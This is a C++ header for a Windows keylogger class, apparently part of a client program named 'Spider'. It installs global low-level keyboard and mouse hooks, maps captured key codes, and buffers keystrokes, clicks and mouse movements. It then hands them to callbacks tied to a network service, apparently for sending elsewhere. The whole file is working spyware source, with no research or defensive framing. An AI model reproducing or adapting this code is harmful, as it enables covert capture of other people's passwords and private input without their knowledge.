//
// Created by roman sztergbaum on 27/09/2017.
//

#ifndef SPIDER_CLIENT_WINKEYLOGGER_HPP
#define SPIDER_CLIENT_WINKEYLOGGER_HPP

#include <WindowsX.h>
#include <memory>
#include <utility>
#include <mutex>
#include <boost/bind.hpp>
#include <boost/circular_buffer.hpp>
#include <boost/variant.hpp>
#include <config/Config.hpp>
#include <Network/IOManager.hpp>
#include <Protocol/Messages.hpp>
#include <Keylogger/KeyLogger.hpp>

namespace spi
{
    class WinKeyLogger : public KeyLogger
    {
    public:
        explicit WinKeyLogger(net::IOManager *service) :
            _service(service), _circularBuffer(10),
            _thread{std::move([this]() {
                this->setupHooks();
                while (GetMessage(nullptr, nullptr, 0, 0));
            })}
        {
            _sharedInstance = this;
        }

        ~WinKeyLogger() override = default;

        bool setup() noexcept override
        {
            return true;
        }

        static LRESULT CALLBACK MouseHookProc(int code, WPARAM wParam, LPARAM lParam) noexcept
        {
            sharedInstance()->MouseHook(code, wParam, lParam);
            return CallNextHookEx(nullptr, code, wParam, lParam);
        }

        void MouseHook(int nCode, WPARAM wParam, LPARAM lParam) noexcept
        {
            if (nCode != HC_ACTION) {
                return;
            }
            switch (wParam) {
                case WM_MOUSEMOVE: {
                    proto::MouseMove mouseMove;

                    mouseMove.x = GET_X_LPARAM(lParam);
                    mouseMove.y = GET_Y_LPARAM(lParam);
                    mouseMove.timestamp = std::chrono::steady_clock::now();

                    std::lock_guard<std::mutex> lock_guard(_bufferMutex);
                    _circularBuffer.push_back({mouseMove});
                }
                    break;
                case WM_MBUTTONDOWN:
                case WM_RBUTTONDOWN:
                case WM_LBUTTONDOWN:
                case WM_LBUTTONUP:
                case WM_RBUTTONUP:
                case WM_MBUTTONUP: {
                    proto::MouseClick mouseClick;

                    mouseClick.x = GET_X_LPARAM(lParam);
                    mouseClick.y = GET_Y_LPARAM(lParam);
                    mouseClick.timestamp = std::chrono::steady_clock::now();
                    switch (wParam) {
                        case WM_MBUTTONUP:
                        case WM_LBUTTONUP:
                        case WM_RBUTTONUP:
                            mouseClick.state = proto::KeyState::Up;
                            break;

                        case WM_RBUTTONDOWN:
                        case WM_LBUTTONDOWN:
                        case WM_MBUTTONDOWN:
                            mouseClick.state = proto::KeyState::Down;
                            break;
                    }
                    switch (wParam) {
                        case WM_MBUTTONDOWN:
                        case WM_MBUTTONUP:
                            mouseClick.button = proto::MouseButton::Middle;
                            break;
                        case WM_RBUTTONUP:
                        case WM_RBUTTONDOWN:
                            mouseClick.button = proto::MouseButton::Right;
                            break;
                        case WM_LBUTTONUP:
                        case WM_LBUTTONDOWN:
                            mouseClick.button = proto::MouseButton::Left;
                            break;
                    }

                    std::lock_guard<std::mutex> lock_guard(_bufferMutex);
                    _circularBuffer.push_back({mouseClick});
                }
                    break;
            }
        }

        void KeyboardHook(int nCode, WPARAM wParam, LPARAM lParam) noexcept
        {
            if (nCode != HC_ACTION) {
                return;
            }

            static const std::unordered_map<char, proto::KeyCode> toBinds = {
                {'A', proto::KeyCode::A},
                {'Z', proto::KeyCode::Z},
                {'E', proto::KeyCode::E},
                {'R', proto::KeyCode::R},
                {'T', proto::KeyCode::T},
                {'Y', proto::KeyCode::Y},
                {'U', proto::KeyCode::U},
                {'I', proto::KeyCode::I},
                {'O', proto::KeyCode::O},
                {'P', proto::KeyCode::P},
                {'Q', proto::KeyCode::Q},
                {'S', proto::KeyCode::S},
                {'D', proto::KeyCode::D},
                {'F', proto::KeyCode::F},
                {'G', proto::KeyCode::G},
                {'H', proto::KeyCode::H},
                {'J', proto::KeyCode::J},
                {'K', proto::KeyCode::K},
                {'L', proto::KeyCode::L},
                {'M', proto::KeyCode::M},
                {'W', proto::KeyCode::W},
                {'X', proto::KeyCode::X},
                {'C', proto::KeyCode::C},
                {'V', proto::KeyCode::V},
                {'B', proto::KeyCode::B},
                {'N', proto::KeyCode::N},
                {'a', proto::KeyCode::a},
                {'z', proto::KeyCode::z},
                {'e', proto::KeyCode::e},
                {'r', proto::KeyCode::r},
                {'t', proto::KeyCode::t},
                {'y', proto::KeyCode::y},
                {'u', proto::KeyCode::u},
                {'i', proto::KeyCode::i},
                {'o', proto::KeyCode::o},
                {'p', proto::KeyCode::p},
                {'q', proto::KeyCode::q},
                {'s', proto::KeyCode::s},
                {'d', proto::KeyCode::d},
                {'f', proto::KeyCode::f},
                {'g', proto::KeyCode::g},
                {'h', proto::KeyCode::h},
                {'j', proto::KeyCode::j},
                {'k', proto::KeyCode::k},
                {'l', proto::KeyCode::l},
                {'m', proto::KeyCode::m},
                {'w', proto::KeyCode::w},
                {'x', proto::KeyCode::x},
                {'c', proto::KeyCode::c},
                {'v', proto::KeyCode::v},
                {'b', proto::KeyCode::b},
                {'n', proto::KeyCode::n},
                {8,   proto::KeyCode::Backspace},
                {9,   proto::KeyCode::Tab},
                {27,  proto::KeyCode::Escape},
                {32,  proto::KeyCode::Space},
                {160, proto::KeyCode::Shift},
                {162, proto::KeyCode::Ctrl},
                {164, proto::KeyCode::Alt},
                {165, proto::KeyCode::AltGr},
            };
            if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN || wParam == WM_KEYUP || wParam == WM_SYSKEYUP) {
                auto p = (PKBDLLHOOKSTRUCT)lParam;

                DWORD code = p->vkCode;
                proto::KeyEvent keyEvent;
                keyEvent.state = wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN ? proto::KeyState::Down : proto::KeyState::Up;

                keyEvent.timestamp = std::chrono::steady_clock::now();
                if (toBinds.find(code) != toBinds.end()) {
                    keyEvent.code = toBinds.at(code);
                } else {
                    _log(logging::Warning) << "Unhandled KeyEvent {" << code << "}" << std::endl;
                    return;
                }

                std::lock_guard<std::mutex> lock_guard(_bufferMutex);
                _circularBuffer.push_back({keyEvent});
            }
        }

        static LRESULT CALLBACK KeyboardHookProc(int code, WPARAM wParam, LPARAM lParam) noexcept
        {
            sharedInstance()->KeyboardHook(code, wParam, lParam);
            return CallNextHookEx(nullptr, code, wParam, lParam);
        }

        void setupHooks() noexcept
        {
            _mouseHook = SetWindowsHookEx(WH_MOUSE_LL, &MouseHookProc, nullptr, 0);
            _keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, &KeyboardHookProc, nullptr, 0);
            _log(logging::Info) << "[HOOKS] Successfully settled" << std::endl;
        }

        void threadFunction() noexcept
        {
            std::lock_guard<std::mutex> _lock_guard(_bufferMutex);

            while (!_circularBuffer.empty()) {

                Events &tmp = _circularBuffer.front();
                _circularBuffer.pop_front();
                switch (tmp.which()) {
                    case 0:
                        _mouseClickCallback(std::move(boost::get<proto::MouseClick>(tmp)));
                        break;
                    case 1:
                        _keyPressCallback(std::move(boost::get<proto::KeyEvent>(tmp)));
                        break;
                    case 2:
                        _mouseMoveCallback(std::move(boost::get<proto::MouseMove>(tmp)));
                        break;
                }
            }
            _service->get().post(boost::bind(&WinKeyLogger::threadFunction, this));
        }

        void run() override
        {
            _log(logging::Info) << "Running..." << std::endl;
            _service->get().post(boost::bind(&WinKeyLogger::threadFunction, this));
        }

        void stop() override
        {
            _log(logging::Info) << "[HOOKS] Remove" << std::endl;
        }

    private:
        net::IOManager *_service;
        HHOOK _keyboardHook{};
        HHOOK _mouseHook{};

        using Events = boost::variant<proto::MouseClick, proto::KeyEvent, proto::MouseMove>;
        boost::circular_buffer<Events> _circularBuffer;
        std::mutex _bufferMutex;

        std::thread _thread;

        static WinKeyLogger *_sharedInstance;

    public:
        static WinKeyLogger *sharedInstance() noexcept
        {
            return _sharedInstance;
        }
    };

    WinKeyLogger *WinKeyLogger::_sharedInstance = nullptr;
}

namespace spi::details
{
    static always_inline KeyLogPtr createKeyLogger(net::IOManager &service)
    {
        return std::make_unique<WinKeyLogger>(&service);
    }
}

#endif //SPIDER_CLIENT_WINKEYLOGGER_HPP
